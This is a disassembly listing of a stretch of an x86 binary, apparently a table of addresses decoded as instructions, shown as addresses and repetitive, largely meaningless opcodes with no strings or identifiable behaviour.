  41a60f:	fild   DWORD PTR [ecx+0x0]
  41a612:	add    ah,bl
  41a614:	inc    ecx
  41a615:	add    BYTE PTR [esp+ebx*8],al
  41a618:	inc    ecx
  41a619:	add    BYTE PTR [ebx+ebx*8],ch
  41a61c:	inc    ecx
  41a61d:	add    BYTE PTR [eax],cl
  41a61f:	fadd   QWORD PTR [ecx+0x0]
  41a622:	cwde   
  41a623:	fild   DWORD PTR [ecx+0x0]
  41a626:	or     al,0xdc
  41a628:	inc    ecx
  41a629:	add    BYTE PTR [eax],dl
  41a62b:	fadd   QWORD PTR [ecx+0x0]
  41a62e:	sub    al,0xdb
  41a630:	inc    ecx
  41a631:	add    BYTE PTR [esp+ebx*8],dl
  41a634:	inc    ecx
  41a635:	add    BYTE PTR [eax],bl
  41a637:	fadd   QWORD PTR [ecx+0x0]
  41a63a:	(bad)  
  41a63c:	inc    ecx
  41a63d:	add    BYTE PTR [esp+ebx*8],bl
  41a640:	inc    ecx
  41a641:	add    BYTE PTR [eax],ah
  41a643:	fadd   QWORD PTR [ecx+0x0]
  41a646:	and    ah,bl
  41a648:	inc    ecx
  41a649:	add    BYTE PTR [esp+ebx*8],ah
  41a64c:	inc    ecx
  41a64d:	add    BYTE PTR [eax],ch
  41a64f:	fadd   QWORD PTR [ecx+0x0]
  41a652:	sub    al,0xdc
  41a654:	inc    ecx
  41a655:	add    BYTE PTR [eax],dh
  41a657:	fadd   QWORD PTR [ecx+0x0]
  41a65a:	xor    al,0xdc
  41a65c:	inc    ecx
  41a65d:	add    BYTE PTR [ebx+ebx*8],cl
  41a660:	inc    ecx
  41a661:	add    BYTE PTR [eax],bh
  41a663:	fadd   QWORD PTR [ecx+0x0]
  41a666:	cmp    al,0xdc
  41a668:	inc    ecx
  41a669:	add    BYTE PTR [eax-0x24],al
  41a66c:	inc    ecx
  41a66d:	add    BYTE PTR [esp+ebx*8+0x41],al
  41a671:	add    BYTE PTR [eax-0x24],cl
  41a674:	inc    ecx
  41a675:	add    BYTE PTR [esp+ebx*8+0x41],cl
  41a679:	add    BYTE PTR [eax-0x24],dl
  41a67c:	inc    ecx
  41a67d:	add    BYTE PTR [esp+ebx*8+0x41],dl
  41a681:	add    BYTE PTR [eax-0x24],bl
  41a684:	inc    ecx
  41a685:	add    BYTE PTR [eax],al
  41a687:	fild   DWORD PTR [ecx+0x0]
  41a68a:	pop    esp
  41a68b:	fadd   QWORD PTR [ecx+0x0]
  41a68e:	and    bl,bl
  41a690:	inc    ecx
  41a691:	add    BYTE PTR [eax-0x24],ah
  41a694:	inc    ecx
  41a695:	add    BYTE PTR [esp+ebx*8+0x41],ah
  41a699:	add    ah,ah
  41a69b:	fiadd  DWORD PTR [ecx+0x0]
  41a69e:	push   0x6c0041dc
  41a6a3:	fadd   QWORD PTR [ecx+0x0]
  41a6a6:	jo     0x41a684
  41a6a8:	inc    ecx
  41a6a9:	add    BYTE PTR [esp+ebx*8+0x41],dh
  41a6ad:	add    BYTE PTR [eax-0x24],bh
  41a6b0:	inc    ecx
  41a6b1:	add    BYTE PTR [esp+ebx*8+0x41],bh
  41a6b5:	add    BYTE PTR [eax-0x7bffbe24],al
  41a6bb:	fadd   QWORD PTR [ecx+0x0]
  41a6be:	mov    ah,bl
  41a6c0:	inc    ecx
  41a6c1:	add    BYTE PTR [esp+ebx*8-0x236fffbf],cl
  41a6c8:	inc    ecx
  41a6c9:	add    BYTE PTR [esp+ebx*8-0x253fffbf],dl
  41a6d0:	inc    ecx
  41a6d1:	add    BYTE PTR [eax-0x63ffbe24],bl
  41a6d7:	fadd   QWORD PTR [ecx+0x0]
  41a6da:	mov    al,ds:0xa40041dc
  41a6df:	fadd   QWORD PTR [ecx+0x0]
  41a6e2:	test   al,0xdc
  41a6e4:	inc    ecx
  41a6e5:	add    ah,bh
  41a6e7:	fild   DWORD PTR [ecx+0x0]
  41a6ea:	lods   al,BYTE PTR ds:[esi]
  41a6eb:	fadd   QWORD PTR [ecx+0x0]
  41a6ee:	mov    al,0xdc
  41a6f0:	inc    ecx
  41a6f1:	add    BYTE PTR [esp+ebx*8-0x2347ffbf],dh
  41a6f8:	inc    ecx
  41a6f9:	add    BYTE PTR [esp+ebx*8-0x233fffbf],bh
  41a700:	inc    ecx
  41a701:	add    ah,al
  41a703:	fadd   QWORD PTR [ecx+0x0]
  41a706:	(bad)  
  41a708:	inc    ecx
  41a709:	add    al,cl
  41a70b:	fadd   QWORD PTR [ecx+0x0]
  41a70e:	int3   
  41a70f:	fadd   QWORD PTR [ecx+0x0]
  41a712:	xchg   esp,eax
  41a713:	fadd   QWORD PTR [ecx+0x0]
  41a716:	int3   
  41a717:	fild   DWORD PTR [ecx+0x0]
  41a71a:	rcr    ah,1
  41a71c:	inc    ecx
  41a71d:	add    ah,dl
  41a71f:	fadd   QWORD PTR [ecx+0x0]
  41a722:	fcomp  st(4)
  41a724:	inc    ecx
  41a725:	add    ah,bl
  41a727:	fadd   QWORD PTR [ecx+0x0]
  41a72a:	loopne 0x41a708
  41a72c:	inc    ecx
  41a72d:	add    ah,ah
  41a72f:	fadd   QWORD PTR [ecx+0x0]
  41a732:	call   0xec41e913
  41a737:	fadd   QWORD PTR [ecx+0x0]
  41a73a:	in     al,dx
  41a73b:	loopne 0x41a77e
  41a73d:	add    al,dh
  41a73f:	loopne 0x41a782
  41a741:	add    ah,dh
  41a743:	loopne 0x41a786
  41a745:	add    al,bh
  41a747:	loopne 0x41a78a
  41a749:	add    ah,bh
  41a74b:	loopne 0x41a78e
  41a74d:	add    BYTE PTR [eax],al
  41a74f:	loope  0x41a792
  41a751:	add    BYTE PTR [ecx+eiz*8],al
  41a754:	inc    ecx
  41a755:	add    BYTE PTR [eax],cl
  41a757:	loope  0x41a79a
  41a759:	add    BYTE PTR [ecx+eiz*8],cl
  41a75c:	inc    ecx
  41a75d:	add    BYTE PTR [eax],dl
  41a75f:	loope  0x41a7a2
  41a761:	add    BYTE PTR [eax],cl
  41a763:	loope  0x41a7a6
  41a765:	add    BYTE PTR [ecx+eiz*8],dl
  41a768:	inc    ecx
  41a769:	add    BYTE PTR [eax],bl
  41a76b:	loope  0x41a7ae
  41a76d:	add    BYTE PTR [ecx+eiz*8],bl
  41a770:	inc    ecx
  41a771:	add    BYTE PTR [ecx+eiz*8],al
  41a774:	inc    ecx
  41a775:	add    BYTE PTR [eax],ah
  41a777:	loope  0x41a7ba
  41a779:	add    BYTE PTR [ecx+eiz*8],ah
  41a77c:	inc    ecx
  41a77d:	add    BYTE PTR [eax],ch
  41a77f:	loope  0x41a7c2
  41a781:	add    BYTE PTR [ecx+eiz*8],ch
  41a784:	inc    ecx
  41a785:	add    BYTE PTR [eax],dh
  41a787:	loope  0x41a7ca
  41a789:	add    BYTE PTR [ecx+eiz*8],dh
  41a78c:	inc    ecx
  41a78d:	add    BYTE PTR [eax],bh
  41a78f:	loope  0x41a7d2
  41a791:	add    BYTE PTR [ecx+eiz*8],bh
  41a794:	inc    ecx
  41a795:	add    BYTE PTR [eax-0x1f],al
  41a798:	inc    ecx
  41a799:	add    BYTE PTR [ecx+eiz*8+0x41],al
  41a79d:	add    BYTE PTR [eax-0x1f],cl
  41a7a0:	inc    ecx
  41a7a1:	add    BYTE PTR [ecx+eiz*8+0x41],cl
  41a7a5:	add    BYTE PTR [eax-0x1f],dl
  41a7a8:	inc    ecx
  41a7a9:	add    BYTE PTR [ecx+eiz*8+0x41],dl
  41a7ad:	add    BYTE PTR [eax-0x1f],bl
  41a7b0:	inc    ecx
  41a7b1:	add    BYTE PTR [ecx+eiz*8+0x41],bl
  41a7b5:	add    BYTE PTR [eax-0x1f],ah
  41a7b8:	inc    ecx
  41a7b9:	add    BYTE PTR [ecx+eiz*8+0x41],ah
  41a7bd:	add    BYTE PTR [eax-0x1f],ch
  41a7c0:	inc    ecx
  41a7c1:	add    BYTE PTR [ecx+eiz*8+0x41],ch
  41a7c5:	add    BYTE PTR [eax-0x1f],dh
  41a7c8:	inc    ecx
  41a7c9:	add    BYTE PTR [ecx+eiz*8+0x41],dh
  41a7cd:	add    BYTE PTR [eax-0x1f],bh
  41a7d0:	inc    ecx
  41a7d1:	add    BYTE PTR [ecx+eiz*8+0x41],bh
  41a7d5:	add    BYTE PTR [eax-0x7bffbe1f],al
  41a7db:	loope  0x41a81e
  41a7dd:	add    BYTE PTR [eax-0x73ffbe1f],cl
  41a7e3:	loope  0x41a826
  41a7e5:	add    BYTE PTR [eax-0x6bffbe1f],dl
  41a7eb:	loope  0x41a82e
  41a7ed:	add    BYTE PTR [eax-0x63ffbe1f],bl
  41a7f3:	loope  0x41a836
  41a7f5:	add    BYTE PTR [eax-0x5bffbe1f],ah
  41a7fb:	loope  0x41a83e
  41a7fd:	add    BYTE PTR [eax-0x53ffbe1f],ch
  41a803:	loope  0x41a846
  41a805:	add    BYTE PTR [eax-0x4bffbe1f],dh
  41a80b:	loope  0x41a84e
  41a80d:	add    BYTE PTR [eax-0x43ffbe1f],bh
  41a813:	loope  0x41a856
  41a815:	add    al,al
  41a817:	loope  0x41a85a
  41a819:	add    BYTE PTR [ecx+eiz*8-0x1e3bffbf],bh
  41a820:	inc    ecx
  41a821:	add    al,cl
  41a823:	loope  0x41a866
  41a825:	add    ah,cl
  41a827:	loope  0x41a86a
  41a829:	add    al,dl
  41a82b:	loope  0x41a86e
  41a82d:	add    ah,dl
  41a82f:	loope  0x41a872
  41a831:	add    BYTE PTR [eax-0x1f],al
  41a834:	inc    ecx
  41a835:	add    al,bl
  41a837:	loope  0x41a87a
  41a839:	add    ah,bl
  41a83b:	loope  0x41a87e
  41a83d:	add    al,ah
  41a83f:	loope  0x41a882
  41a841:	add    ah,ah
  41a843:	loope  0x41a886
  41a845:	add    ah,ch
  41a847:	loopne 0x41a88a
  41a849:	add    al,ch
  41a84b:	loope  0x41a88e
  41a84d:	add    BYTE PTR [eax-0xbffbe1f],dl
  41a853:	loopne 0x41a896
  41a855:	add    ah,ch
  41a857:	loope  0x41a89a
  41a859:	add    al,dh
  41a85b:	loope  0x41a89e
  41a85d:	add    ah,dh
  41a85f:	loope  0x41a8a2
  41a861:	add    al,bh
  41a863:	loope  0x41a8a6
  41a865:	add    ah,bh
  41a867:	loope  0x41a8aa
  41a869:	add    BYTE PTR [eax],al
  41a86b:	loop   0x41a8ae
  41a86d:	add    BYTE PTR [eax-0x1f],bh
  41a870:	inc    ecx
  41a871:	add    BYTE PTR [edx+eiz*8],al
  41a874:	inc    ecx
  41a875:	add    BYTE PTR [eax],cl
  41a877:	loop   0x41a8ba
  41a879:	add    BYTE PTR [edx+eiz*8],cl
  41a87c:	inc    ecx
  41a87d:	add    ah,ch
  41a87f:	loope  0x41a8c2
  41a881:	add    BYTE PTR [eax],dl
  41a883:	loop   0x41a8c6
  41a885:	add    BYTE PTR [edx+eiz*8],dl
  41a888:	inc    ecx
  41a889:	add    al,ch
  41a88b:	loope  0x41a8ce
  41a88d:	add    BYTE PTR [ecx+eiz*8+0x41],ah
  41a891:	add    ah,bl
  41a893:	loope  0x41a8d6
  41a895:	add    BYTE PTR [eax],bl
  41a897:	loop   0x41a8da
  41a899:	add    BYTE PTR [edx+eiz*8],bl
  41a89c:	inc    ecx
  41a89d:	add    BYTE PTR [eax],ah
  41a89f:	loop   0x41a8e2
  41a8a1:	add    BYTE PTR [edx+eiz*8],ah
  41a8a4:	inc    ecx
  41a8a5:	add    BYTE PTR [eax],ch
  41a8a7:	loop   0x41a8ea
  41a8a9:	add    BYTE PTR [edx+eiz*8],ch
  41a8ac:	inc    ecx
  41a8ad:	add    BYTE PTR [eax],dh
  41a8af:	loop   0x41a8f2
  41a8b1:	add    BYTE PTR [edx+eiz*8],dh
  41a8b4:	inc    ecx
  41a8b5:	add    BYTE PTR [eax],bh
  41a8b7:	loop   0x41a8fa
  41a8b9:	add    BYTE PTR [edx+eiz*8],bh
  41a8bc:	inc    ecx
  41a8bd:	add    ah,dh
  41a8bf:	loopne 0x41a902
  41a8c1:	add    al,dh
  41a8c3:	loope  0x41a906
  41a8c5:	add    BYTE PTR [edx+eiz*8],al
  41a8c8:	inc    ecx
  41a8c9:	add    BYTE PTR [eax-0x1e],al
  41a8cc:	inc    ecx
  41a8cd:	add    BYTE PTR [edx+eiz*8+0x41],al
  41a8d1:	add    BYTE PTR [eax-0x1e],cl
  41a8d4:	inc    ecx
  41a8d5:	add    BYTE PTR [edx+eiz*8+0x41],cl
  41a8d9:	add    BYTE PTR [eax-0x1e],dl
  41a8dc:	inc    ecx
  41a8dd:	add    BYTE PTR [edx+eiz*8+0x41],dl
  41a8e1:	add    BYTE PTR [eax-0x1f],dh
  41a8e4:	inc    ecx
  41a8e5:	add    BYTE PTR [eax-0x1e],bl
  41a8e8:	inc    ecx
  41a8e9:	add    BYTE PTR [edx+eiz*8+0x41],bl
  41a8ed:	add    BYTE PTR [eax-0x1e],ah
  41a8f0:	inc    ecx
  41a8f1:	add    BYTE PTR [edx+eiz*8+0x41],ah
  41a8f5:	add    BYTE PTR [eax-0x1e],ch
  41a8f8:	inc    ecx
  41a8f9:	add    BYTE PTR [edx+eiz*8+0x41],ch
  41a8fd:	add    BYTE PTR [eax-0x1e],dh
  41a900:	inc    ecx
  41a901:	add    BYTE PTR [eax],cl
  41a903:	loope  0x41a946
  41a905:	add    BYTE PTR [eax],ch
  41a907:	loope  0x41a94a
  41a909:	add    BYTE PTR [edx+eiz*8],ah
  41a90c:	inc    ecx
  41a90d:	add    BYTE PTR [edx+eiz*8+0x41],dh
  41a911:	add    BYTE PTR [eax-0x1e],bh
  41a914:	inc    ecx
  41a915:	add    BYTE PTR [edx+eiz*8+0x41],bh
  41a919:	add    BYTE PTR [eax-0x1e],al
  41a91c:	inc    ecx
  41a91d:	add    BYTE PTR [eax-0x7bffbe1e],al
  41a923:	loop   0x41a966
  41a925:	add    BYTE PTR [eax+0x200041e2],cl
  41a92b:	loop   0x41a96e
  41a92d:	add    BYTE PTR [edx+eiz*8-0x1d6fffbf],cl
  41a934:	inc    ecx
  41a935:	add    BYTE PTR [edx+eiz*8-0x1d67ffbf],dl
  41a93c:	inc    ecx
  41a93d:	add    BYTE PTR [edx+eiz*8-0x1edfffbf],bl
  41a944:	inc    ecx
  41a945:	add    BYTE PTR [eax-0xbffbe1e],ah
  41a94b:	loopne 0x41a98e
  41a94d:	add    BYTE PTR [eax-0x1f],al
  41a950:	inc    ecx
  41a951:	add    BYTE PTR [edx+eiz*8-0x1df7ffbf],ah
  41a958:	inc    ecx
  41a959:	add    ah,ch
  41a95b:	loopne 0x41a99e
  41a95d:	add    BYTE PTR [eax],dh
  41a95f:	loop   0x41a9a2
  41a961:	add    BYTE PTR [eax-0x1f],bh
  41a964:	inc    ecx
  41a965:	add    BYTE PTR [eax-0x53ffbe1e],ch
  41a96b:	loop   0x41a9ae
  41a96d:	add    BYTE PTR [eax-0x53ffbe1e],dh
  41a973:	loope  0x41a9b6
  41a975:	add    BYTE PTR [edx+eiz*8+0x41],bl
  41a979:	add    BYTE PTR [edx+eiz*8-0x1d47ffbf],dh
  41a980:	inc    ecx
  41a981:	add    BYTE PTR [edx+eiz*8-0x1d9bffbf],bh
  41a988:	inc    ecx
  41a989:	add    al,al
  41a98b:	loop   0x41a9ce
  41a98d:	add    ah,ch
  41a98f:	loope  0x41a9d2
  41a991:	add    BYTE PTR [ecx+eiz*8+0x41],dl
  41a995:	add    BYTE PTR [eax],al
  41a997:	loope  0x41a9da
  41a999:	add    ah,al
  41a99b:	loop   0x41a9de
  41a99d:	add    al,cl
  41a99f:	loop   0x41a9e2
  41a9a1:	add    ah,cl
  41a9a3:	loop   0x41a9e6
  41a9a5:	add    al,dl
  41a9a7:	loop   0x41a9ea
  41a9a9:	add    ah,dl
  41a9ab:	loop   0x41a9ee
  41a9ad:	add    al,bl
  41a9af:	loop   0x41a9f2
  41a9b1:	add    ah,bl
  41a9b3:	loop   0x41a9f6
  41a9b5:	add    BYTE PTR [eax+0x680041e2],cl
  41a9bb:	loope  0x41a9fe
  41a9bd:	add    al,ah
  41a9bf:	loop   0x41aa02
  41a9c1:	add    ah,ah
  41a9c3:	loop   0x41aa06
  41a9c5:	add    BYTE PTR [eax],cl
  41a9c7:	loope  0x41aa0a
  41a9c9:	add    al,al
  41a9cb:	loop   0x41aa0e
  41a9cd:	add    al,ch
  41a9cf:	loop   0x41aa12
  41a9d1:	add    ah,ch
  41a9d3:	loop   0x41aa16
  41a9d5:	add    BYTE PTR [eax],bl
  41a9d7:	loope  0x41aa1a
  41a9d9:	add    al,dh
  41a9db:	loop   0x41aa1e
  41a9dd:	add    ah,ah
  41a9df:	loope  0x41aa22
  41a9e1:	add    ah,ch
  41a9e3:	loope  0x41aa26
  41a9e5:	add    ah,dh
  41a9e7:	loop   0x41aa2a
  41a9e9:	add    BYTE PTR [edx+eiz*8+0x41],bl
  41a9ed:	add    ah,bh
  41a9ef:	loope  0x41aa32
  41a9f1:	add    BYTE PTR [eax],ch
  41a9f3:	loop   0x41aa36
  41a9f5:	add    BYTE PTR [ecx+eiz*8+0x41],dl
  41a9f9:	add    BYTE PTR [eax-0x4fffbe1e],dh
  41a9ff:	loope  0x41aa42
  41aa01:	add    al,bh
  41aa03:	loop   0x41aa46
  41aa05:	add    BYTE PTR [edx+eiz*8-0x1d03ffbf],dh
  41aa0c:	inc    ecx
  41aa0d:	add    BYTE PTR [eax],al
  41aa0f:	jecxz  0x41aa52
  41aa11:	add    BYTE PTR [ecx+eiz*8-0x1cfbffbf],bh
  41aa18:	inc    ecx
  41aa19:	add    al,bh
  41aa1b:	loop   0x41aa5e
  41aa1d:	add    ah,bh
  41aa1f:	loope  0x41aa62
  41aa21:	add    BYTE PTR [eax],cl
  41aa23:	jecxz  0x41aa66
  41aa25:	add    BYTE PTR [ebx+eiz*8],cl
  41aa28:	inc    ecx
  41aa29:	add    BYTE PTR [eax],dl
  41aa2b:	jecxz  0x41aa6e
  41aa2d:	add    BYTE PTR [eax+0x140041e2],bl
  41aa33:	jecxz  0x41aa76
  41aa35:	add    BYTE PTR [ebx+eiz*8],cl
  41aa38:	inc    ecx
  41aa39:	add    BYTE PTR [edx+eiz*8+0x41],ch
  41aa3d:	add    BYTE PTR [edx+eiz*8-0x1ce7ffbf],dl
  41aa44:	inc    ecx
  41aa45:	add    BYTE PTR [ebx+eiz*8],bl
  41aa48:	inc    ecx
  41aa49:	add    ah,cl
  41aa4b:	loope  0x41aa8e
  41aa4d:	add    BYTE PTR [eax],ah
  41aa4f:	jecxz  0x41aa92
  41aa51:	add    BYTE PTR [ebx+eiz*8],ah
  41aa54:	inc    ecx
  41aa55:	add    BYTE PTR [eax],ch
  41aa57:	jecxz  0x41aa9a
  41aa59:	add    BYTE PTR [ebx+eiz*8],ch
  41aa5c:	inc    ecx
  41aa5d:	add    BYTE PTR [eax],dh
  41aa5f:	jecxz  0x41aaa2
  41aa61:	add    ah,cl
  41aa63:	loop   0x41aaa6
  41aa65:	add    ah,dh
  41aa67:	loope  0x41aaaa
  41aa69:	add    BYTE PTR [ebx+eiz*8],dh
  41aa6c:	inc    ecx
  41aa6d:	add    BYTE PTR [eax],bh
  41aa6f:	jecxz  0x41aab2
  41aa71:	add    BYTE PTR [ebx+eiz*8],bh
  41aa74:	inc    ecx
  41aa75:	add    BYTE PTR [eax-0x1d],al
  41aa78:	inc    ecx
  41aa79:	add    BYTE PTR [ebx+eiz*8+0x41],al
  41aa7d:	add    ah,al
  41aa7f:	loope  0x41aac2
  41aa81:	add    BYTE PTR [edx+eiz*8+0x41],ah
  41aa85:	add    BYTE PTR [edx+eiz*8-0x1d47ffbf],ah
  41aa8c:	inc    ecx
  41aa8d:	add    BYTE PTR [eax],ah
  41aa8f:	loope  0x41aad2
  41aa91:	add    BYTE PTR [edx+eiz*8-0x1cb7ffbf],bl
  41aa98:	inc    ecx
  41aa99:	add    BYTE PTR [ebx+eiz*8+0x41],cl
  41aa9d:	add    BYTE PTR [eax-0x1d],dl
  41aaa0:	inc    ecx
  41aaa1:	add    BYTE PTR [ecx+eiz*8+0x41],ah
  41aaa5:	add    BYTE PTR [eax-0x1e],ch
  41aaa8:	inc    ecx
  41aaa9:	add    BYTE PTR [ebx+eiz*8+0x41],dl
  41aaad:	add    BYTE PTR [ecx+eiz*8-0x1e3fffbf],ch
  41aab4:	inc    ecx
  41aab5:	add    ah,dh
  41aab7:	loopne 0x41aafa
  41aab9:	add    BYTE PTR [eax-0x1d],bl
  41aabc:	inc    ecx
  41aabd:	add    BYTE PTR [ecx+eiz*8],ch
  41aac0:	inc    ecx
  41aac1:	add    BYTE PTR [ebx+eiz*8+0x41],bl
  41aac5:	add    BYTE PTR [eax-0x1d],ah
  41aac8:	inc    ecx
  41aac9:	add    BYTE PTR [ebx+eiz*8+0x41],ah
  41aacd:	add    BYTE PTR [eax+0x680041e2],ah
  41aad3:	jecxz  0x41ab16
  41aad5:	add    BYTE PTR [ebx+eiz*8+0x41],ch
  41aad9:	add    BYTE PTR [eax-0x1d],dh
  41aadc:	inc    ecx
  41aadd:	add    BYTE PTR [ebx+eiz*8+0x41],dh
  41aae1:	add    BYTE PTR [ecx+eiz*8-0x1c97ffbf],ah
  41aae8:	inc    ecx
  41aae9:	add    BYTE PTR [eax-0x1d],bh
  41aaec:	inc    ecx
  41aaed:	add    BYTE PTR [ebx+eiz*8+0x41],bh
  41aaf1:	add    BYTE PTR [eax-0x1d],ch
  41aaf4:	inc    ecx
  41aaf5:	add    BYTE PTR [eax+0x500041e1],ah
  41aafb:	loop   0x41ab3e
  41aafd:	add    al,bl
  41aaff:	loop   0x41ab42
  41ab01:	add    al,al
  41ab03:	loope  0x41ab46
  41ab05:	add    al,ah
  41ab07:	loop   0x41ab4a
  41ab09:	add    BYTE PTR [eax-0x7bffbe1d],al
  41ab0f:	jecxz  0x41ab52
  41ab11:	add    BYTE PTR [eax-0x43ffbe1f],al
  41ab17:	loop   0x41ab5a
  41ab19:	add    BYTE PTR [eax+0x300041e3],cl
  41ab1f:	loope  0x41ab62
  41ab21:	add    BYTE PTR [eax-0x1f],bh
  41ab24:	inc    ecx
  41ab25:	add    BYTE PTR [edx+eiz*8-0x1c73ffbf],dl
  41ab2c:	inc    ecx
  41ab2d:	add    BYTE PTR [eax-0x27ffbe1d],dl
  41ab33:	loope  0x41ab76
  41ab35:	add    BYTE PTR [ebx+eiz*8-0x1eefffbf],dl
  41ab3c:	inc    ecx
  41ab3d:	add    BYTE PTR [ecx+eiz*8+0x41],bh
  41ab41:	add    BYTE PTR [eax+0x680041e3],bl
  41ab47:	loop   0x41ab8a
  41ab49:	add    BYTE PTR [ebx+eiz*8-0x1e73ffbf],bl
  41ab50:	inc    ecx
  41ab51:	add    BYTE PTR [eax+0xc0041e3],ah
  41ab57:	loope  0x41ab9a
  41ab59:	add    BYTE PTR [ebx+eiz*8-0x1d53ffbf],ah
  41ab60:	inc    ecx
  41ab61:	add    BYTE PTR [eax-0x53ffbe1d],ch
  41ab67:	jecxz  0x41abaa
  41ab69:	add    BYTE PTR [ecx+eiz*8-0x1e47ffbf],ah
  41ab70:	inc    ecx
  41ab71:	add    BYTE PTR [ecx+eiz*8],ch
  41ab74:	inc    ecx
  41ab75:	add    BYTE PTR [eax-0x1d],al
  41ab78:	inc    ecx
  41ab79:	add    BYTE PTR [eax-0x4fffbe1f],al
  41ab7f:	jecxz  0x41abc2
  41ab81:	add    BYTE PTR [ebx+eiz*8-0x1cabffbf],dh
  41ab88:	inc    ecx
  41ab89:	add    ah,bl
  41ab8b:	loop   0x41abce
  41ab8d:	add    BYTE PTR [edx+eiz*8+0x41],al
  41ab91:	add    al,ah
  41ab93:	loope  0x41abd6
  41ab95:	add    BYTE PTR [ebx+eiz*8],ah
  41ab98:	inc    ecx
  41ab99:	add    BYTE PTR [eax-0x1e],bh
  41ab9c:	inc    ecx
  41ab9d:	add    BYTE PTR [eax+0x5c0041e3],bh
  41aba3:	jecxz  0x41abe6
  41aba5:	add    BYTE PTR [eax],dh
  41aba7:	loop   0x41abea
  41aba9:	add    BYTE PTR [eax-0x43ffbe1d],ch
  41abaf:	jecxz  0x41abf2
  41abb1:	add    BYTE PTR [eax+0x200041e2],ah
  41abb7:	loope  0x41abfa
  41abb9:	add    BYTE PTR [eax-0x1e],dl
  41abbc:	inc    ecx
  41abbd:	add    al,al
  41abbf:	jecxz  0x41ac02
  41abc1:	add    ah,al
  41abc3:	jecxz  0x41ac06
  41abc5:	add    ah,dh
  41abc7:	loope  0x41ac0a
  41abc9:	add    BYTE PTR [eax-0x37ffbe1d],al
  41abcf:	jecxz  0x41ac12
  41abd1:	add    ah,cl
  41abd3:	jecxz  0x41ac16
  41abd5:	add    BYTE PTR [edx+eiz*8-0x1c2fffbf],bl
  41abdc:	inc    ecx
  41abdd:	add    ah,dl
  41abdf:	jecxz  0x41ac22
  41abe1:	add    BYTE PTR [edx+eiz*8-0x1e4bffbf],bh
  41abe8:	inc    ecx
  41abe9:	add    BYTE PTR [eax],cl
  41abeb:	fld    QWORD PTR [ecx+0x0]
  41abee:	or     al,0xdd
  41abf0:	inc    ecx
  41abf1:	add    BYTE PTR [eax],dl
  41abf3:	fld    QWORD PTR [ecx+0x0]
  41abf6:	adc    al,0xdd
  41abf8:	inc    ecx
  41abf9:	add    BYTE PTR [eax],bl
  41abfb:	fld    QWORD PTR [ecx+0x0]
  41abfe:	sbb    al,0xdd
  41ac00:	inc    ecx
  41ac01:	add    BYTE PTR [eax],ah
  41ac03:	fld    QWORD PTR [ecx+0x0]
  41ac06:	and    al,0xdd
  41ac08:	inc    ecx
  41ac09:	add    BYTE PTR [eax],ch
  41ac0b:	fld    QWORD PTR [ecx+0x0]
  41ac0e:	sub    al,0xdd
  41ac10:	inc    ecx
  41ac11:	add    BYTE PTR [eax],dh
  41ac13:	fld    QWORD PTR [ecx+0x0]
  41ac16:	xor    al,0xdd
  41ac18:	inc    ecx
  41ac19:	add    BYTE PTR [eax],bh
  41ac1b:	fld    QWORD PTR [ecx+0x0]
  41ac1e:	cmp    al,0xdd
  41ac20:	inc    ecx
  41ac21:	add    BYTE PTR [eax-0x23],al
  41ac24:	inc    ecx
  41ac25:	add    BYTE PTR [ebp+ebx*8+0x41],al
  41ac29:	add    BYTE PTR [eax-0x23],cl
  41ac2c:	inc    ecx
  41ac2d:	add    BYTE PTR [ebp+ebx*8+0x41],cl
  41ac31:	add    BYTE PTR [eax-0x23],dl
  41ac34:	inc    ecx
  41ac35:	add    BYTE PTR [ebp+ebx*8+0x41],dl
  41ac39:	add    BYTE PTR [eax-0x23],bl
  41ac3c:	inc    ecx
  41ac3d:	add    BYTE PTR [ebp+ebx*8+0x41],bl
  41ac41:	add    BYTE PTR [eax-0x23],ah
  41ac44:	inc    ecx
  41ac45:	add    BYTE PTR [ebp+ebx*8+0x41],ah
  41ac49:	add    BYTE PTR [eax-0x23],ch
  41ac4c:	inc    ecx
  41ac4d:	add    BYTE PTR [ebp+ebx*8+0x41],ch
  41ac51:	add    BYTE PTR [eax-0x23],dh
  41ac54:	inc    ecx
  41ac55:	add    BYTE PTR [ebp+ebx*8+0x41],dh
  41ac59:	add    BYTE PTR [eax-0x23],bh
  41ac5c:	inc    ecx
  41ac5d:	add    BYTE PTR [ebp+ebx*8+0x41],bh
  41ac61:	add    BYTE PTR [eax-0x7bffbe23],al
  41ac67:	fld    QWORD PTR [ecx+0x0]
  41ac6a:	mov    ch,bl
  41ac6c:	inc    ecx
  41ac6d:	add    BYTE PTR [ebp+ebx*8-0x226fffbf],cl
  41ac74:	inc    ecx
  41ac75:	add    BYTE PTR [ebp+ebx*8-0x2267ffbf],dl
  41ac7c:	inc    ecx
  41ac7d:	add    BYTE PTR [ebp+ebx*8-0x225fffbf],bl
  41ac84:	inc    ecx
  41ac85:	add    BYTE PTR [ebp+ebx*8-0x2257ffbf],ah
  41ac8c:	inc    ecx
  41ac8d:	add    BYTE PTR [ebp+ebx*8-0x224fffbf],ch
  41ac94:	inc    ecx
  41ac95:	add    BYTE PTR [ebp+ebx*8-0x2247ffbf],dh
  41ac9c:	inc    ecx
  41ac9d:	add    BYTE PTR [ebp+ebx*8-0x223fffbf],bh
  41aca4:	inc    ecx
  41aca5:	add    BYTE PTR [ebp+ebx*8-0x223bffbf],bl
  41acac:	inc    ecx
  41acad:	add    al,cl
  41acaf:	fld    QWORD PTR [ecx+0x0]
  41acb2:	int3   
  41acb3:	fld    QWORD PTR [ecx+0x0]
  41acb6:	rcr    ch,1
  41acb8:	inc    ecx
  41acb9:	add    ah,dl
  41acbb:	fld    QWORD PTR [ecx+0x0]
  41acbe:	mov    al,0xdd
  41acc0:	inc    ecx
  41acc1:	add    al,bl
  41acc3:	fld    QWORD PTR [ecx+0x0]
  41acc6:	(bad)  
  41acc8:	inc    ecx
  41acc9:	add    al,ah
  41accb:	fld    QWORD PTR [ecx+0x0]
  41acce:	in     al,0xdd
  41acd0:	inc    ecx
  41acd1:	add    al,ch
  41acd3:	fld    QWORD PTR [ecx+0x0]
  41acd6:	in     al,dx
  41acd7:	fld    QWORD PTR [ecx+0x0]
  41acda:	lock fld QWORD PTR [ecx+0x0]
  41acde:	hlt    
  41acdf:	fld    QWORD PTR [ecx+0x0]
  41ace2:	clc    
  41ace3:	fld    QWORD PTR [ecx+0x0]
  41ace6:	cld    
  41ace7:	fld    QWORD PTR [ecx+0x0]
  41acea:	add    dh,bl
  41acec:	inc    ecx
  41aced:	add    BYTE PTR [esi+ebx*8],al
  41acf0:	inc    ecx
  41acf1:	add    BYTE PTR [eax],cl
  41acf3:	fiadd  WORD PTR [ecx+0x0]
  41acf6:	or     al,0xde
  41acf8:	inc    ecx
  41acf9:	add    BYTE PTR [eax],dl
